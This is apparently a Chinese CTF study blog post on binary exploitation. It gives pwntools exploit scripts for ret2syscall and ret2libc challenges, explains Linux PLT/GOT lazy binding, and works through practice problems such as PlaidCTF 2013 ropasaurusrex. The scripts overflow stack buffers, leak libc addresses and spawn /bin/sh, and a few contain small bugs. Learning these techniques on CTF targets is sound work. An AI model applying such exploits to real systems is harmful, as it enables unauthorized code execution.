<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335469653-97f966c2-e116-4976-842a-adffcaefd70a.png" alt="image.png"></p>
<p>以及需要的 int 0x80：<code>ROPgadget --binary rop --only &#39;int&#39;</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335607223-0e92b707-49c5-4e31-9bbf-fcb7a4764a6e.png" alt="image.png"></p>
<p>有偏移的长度：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574336747696-914e4724-c8c3-4ba1-b65d-cb3a93459f68.png" alt="image.png"></p>
<p>最后写出 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""自己写的"""</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">"""ctf-wiki上的"""</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="comment">#flat模块能将pattern字符串和地址结合并且转为字节模式</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><p>控制程序执行 libc 中的参数，通常是返回到某个函数的 plt 处，或者某个函数的具体位置（函数对应 got 表项的内容），一般情况会选择执行 system(‘/bin/sh’)</p>
<p>看第一个程序：</p>
<p>得到偏移：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574403535178-184d2107-b762-47bd-9dda-d629e74d4483.png" alt="image.png"></p>
<p>同时找到：/bin/sh 与 system 的地址</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407070973-4b88be2e-6388-4c28-b14e-83ffa84124e0.png" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407137985-b2057cf8-fad6-4a89-80a8-355dc9f41fdc.png" alt="image.png"></p>
<p>构造 exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2libc1&apos;)</span><br><span class="line">bin_addr=0x8048720</span><br><span class="line">sys_addr=0x8048460</span><br><span class="line">payload=&apos;a&apos;*112 + p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(bin_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>这一个没有了 “/bin/sh” 字符串，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh </p>
<p>通过查找，可以找到的数据如下：</p>
<p>sys_addr=0x8048490</p>
<p>get_addr=0x8048460</p>
<p>bss_addr=0x804A080</p>
<p>通过这些数据可以写出 exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2libc2&apos;)</span><br><span class="line">sys_addr=0x8048490</span><br><span class="line">get_addr=0x8048460</span><br><span class="line">bss_addr=0x804A080</span><br><span class="line">payload = &apos;a&apos;*112 +p32(get_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><p>没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址</p>
<p>获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址</p>
<p>总的来说：</p>
<p>1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</p>
<p>2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘/bin/sh’)</p>
<p>3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址</p>
<p>4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</p>
<p>自己写的exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf=ELF(&apos;ret2libc3&apos;)</span><br><span class="line">p=process(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=elf.got[&apos;puts&apos;]</span><br><span class="line">start_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload1=&apos;A&apos;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&quot;puts&quot;)</span><br><span class="line">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload2=&apos;A&apos;*112+p32(system_addr)+p32(1234)+p32(binsh_addr)</span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>dalao的 exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">start_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">print &quot;[*]puts plt: &quot; + hex(puts_plt)</span><br><span class="line">print &quot;[*]puts got: &quot; + hex(puts_got)</span><br><span class="line">print &quot;[*]_start addr: &quot; + hex(start_addr)</span><br><span class="line">print &quot;[*]libc addr: &quot; + hex(libc.address)</span><br><span class="line">print &quot;--&quot; * 20</span><br><span class="line">print &quot;[*]sending payload1 to leak libc...&quot;</span><br><span class="line"></span><br><span class="line">payload = flat([&quot;A&quot; * 112, puts_plt, start_addr, puts_got])</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;Can you find it !?&quot;, payload)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;[*]leak puts addr: &quot; + hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">print &quot;[*]leak libc addr: &quot; + hex(libc.address)</span><br><span class="line">print &quot;[*]system addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;[*]binsh addr: &quot; + hex(binsh_addr)</span><br><span class="line">print &quot;--&quot; * 20</span><br><span class="line">print &quot;[*]sending payload2 to getshell...&quot;</span><br><span class="line"></span><br><span class="line">payload2 = flat([&quot;B&quot; * 112, system_addr, &quot;CCCC&quot;, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="train-cs-nctu-edu-tw：ret2libc"><a href="#train-cs-nctu-edu-tw：ret2libc" class="headerlink" title="train.cs.nctu.edu.tw：ret2libc"></a>train.cs.nctu.edu.tw：ret2libc</h3><p>这道题开启了 NX 保护，然而运行的时候会把 puts 的地址跟 /bin/sh 的地址告诉我们，使用 pwntools 可以把地址提取出来，再根据 libcsearcher 查出 system 的地址，这样就可以 getshell 了</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">bin_addr = int(p.recvuntil(&apos;\n), 16)</span><br><span class="line">print hex(bin_addr)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">puts_addr = int(p.recvuntil(&apos;\n&apos;), 16)</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(&apos;puts&apos;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&apos;system&apos;)</span><br><span class="line">payload2=&apos;a&apos;*32+p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>讲一下 <code>p.recvuntil(&#39;is &#39;)</code> 代表的是 “is “之前的那一块，当下一个 recvuntil 的时候就会把这那块去掉了</p>
<p>把脚本里的第一个 <code>p.recvuntil(&#39;is &#39;)</code> 替换成 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print p.recvuntil(&apos;of &apos;)</span><br><span class="line">print p.recvuntil(&apos;is &apos;)</span><br></pre></td></tr></table></figure>

<p>就可以看出来作用是什么</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586037138-97e8c208-e876-48ca-b9cd-0a64d829175f.png" alt="image.png"></p>
<p>ps.正常会输出这一些（”^C”是ctrl+c退出造成的，不包括）：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586260374-add330e2-4491-4b46-9980-2f450c34faf6.png" alt="image.png"></p>
<h2 id="Linux动态链接"><a href="#Linux动态链接" class="headerlink" title="Linux动态链接"></a>Linux动态链接</h2><p><a href="https://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener">参考博文</a></p>
<p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p>
<h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p>
<p>使用如下源代码 test.c：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依次使用下列命令进行编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure>

<p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p>
<p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png" alt="image.png"></p>
<p>printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p>
<p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p>
<p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>

<p>总体来说，动态链接每个函数需要两个东西：</p>
<p>1、用来存放外部函数地址的数据段</p>
<p>2、用来获取数据段记录的外部函数地址的代码</p>
<p>应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/268938/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg" alt="20160611124517413.jpg"></p>
<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
<p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="line">void printf@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *printf@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 printf 地址，并写到 printf@got</span><br><span class="line">    goto address_good;//再返回去执行address_good</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了</p>
<p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p>
<p>接下来，我们就来看一下这个“找”的工作是怎么实现的：</p>
<p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 80482d6:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 80482dc:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 80482e6:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 80482eb:   e9 e0 ff ff ff          jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 80482f6:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 80482fb:   e9 d0 ff ff ff          jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure>

<p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p>
<p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p>
<p>（说一下怎么查看，先 <code>gdb test</code> 然后 <code>b main</code>，再 <code>run</code>， 再 <code>x/x jmp的那个地址</code> 就可以）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png" alt="image.png"></p>
<p>还得之前我们说的，在还没有执行过函数之前 printf@got 的内容是 lookup_printf 函数的地址吗，这就是要去找 printf 函数的地址了</p>
<p>现在要做的是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $0x0    //将数据压到栈上，作为将要执行的函数的参数</span><br><span class="line">jmp    0x80482d0   //去到了第一个表项</span><br></pre></td></tr></table></figure>

<p>接下来继续</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  0x804a004  //将数据压到栈上，作为后面函数的参数</span><br><span class="line">jmp    *0x804a008 //跳转到函数</span><br><span class="line">add    %al,(%eax)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="image.png"></p>
<p>当执行后他有了值</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="image.png"></p>
<p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p>
<p>那现在做一个小总结：</p>
<p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>
<p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p>
<p>到这里我们还需要知道</p>
<ol>
<li>_dl_runtime_resolve 是怎么知道要查找 printf 函数的</li>
<li>_dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li>
</ol>
<p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址</p>
<p>在 elf文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="image.png"></p>
<p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p>
<p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p>
<blockquote>
<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>
<p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p>
<p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p>
<p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>
<p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
</blockquote>
<p><strong>跟着大佬的流程图来走一遍：</strong></p>
<p>第一次调用</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p>
<p>之后再次调用<img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" alt="img"></p>
<h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><h3 id="train-cs-nctu-edu-tw：rop"><a href="#train-cs-nctu-edu-tw：rop" class="headerlink" title="train.cs.nctu.edu.tw：rop"></a>train.cs.nctu.edu.tw：rop</h3><p>没找到题目，从<a href="http://baymrx.me/2019/08/17/PWN刷题记录——train-cs-nctu-edu-tw-rop/" target="_blank" rel="noopener">大佬博客</a>里面找到的，题目使用 nc 连上以后会输出这些 gadgets 需要自己去构造 payload</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.png" alt="1566026309029.png"></p>
<p>把 push 的那一些16进制转换一下</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.png" alt="image.png"></p>
<p>大佬说通过这些就可以构造出 payload 了</p>
<p>exp：我连不上。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,10001)</span><br><span class="line">payload = &quot;9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0&quot;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2013-PlaidCTF-ropasaurusrex"><a href="#2013-PlaidCTF-ropasaurusrex" class="headerlink" title="2013-PlaidCTF-ropasaurusrex"></a>2013-PlaidCTF-ropasaurusrex</h3><p>没有 system 和 /bin/sh，通过 ret2libc 的方法在libc里面找到，这里注意一下第一次泄露的是 got 表的内容，写成了 plt 的，结果废了两个小时没看出来，还以为又出现了什么超出知识水平的操作，，CTF需要视力！！</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./rop&apos;)</span><br><span class="line">elf=ELF(&apos;./rop&apos;)</span><br><span class="line">write_plt=elf.plt[&apos;write&apos;]</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">payload=&apos;a&apos;*140+p32(write_plt)+p32(0x80483F4)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;write&apos;,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(&apos;write&apos;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&apos;system&apos;)</span><br><span class="line">bin_addr=libc_base+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1=&apos;a&apos;*140+p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Defcon-2015-Qualifier-R0pbaby"><a href="#Defcon-2015-Qualifier-R0pbaby" class="headerlink" title="Defcon 2015 Qualifier: R0pbaby"></a>Defcon 2015 Qualifier: R0pbaby</h3><p>checksec 检查一下，发现是64位程序，所以参数应该是存储在 rdi 寄存器上</p>
<p>64 位程序当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
<p>通过 ROPgadget –binary /libc/x86_64-linux-gnu/ libc.so.6 –only “pop|ret” | grep “rdi”</p>
<p>获取到 pop rdi ；ret 的地址：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663502432-70335a77-3256-4ba8-adf0-f7208c5b7ed7.png" alt="image.png"></p>
<p>通过程序自身提供的功能，可以获取到 libc 的地址与任意函数的地址</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663904109-6e3aa29a-7ae6-48f4-98f6-7ba99c5cf511.png" alt="image.png"></p>
<p>同时第三个功能存在溢出，经过计算溢出的长度为 8 </p>
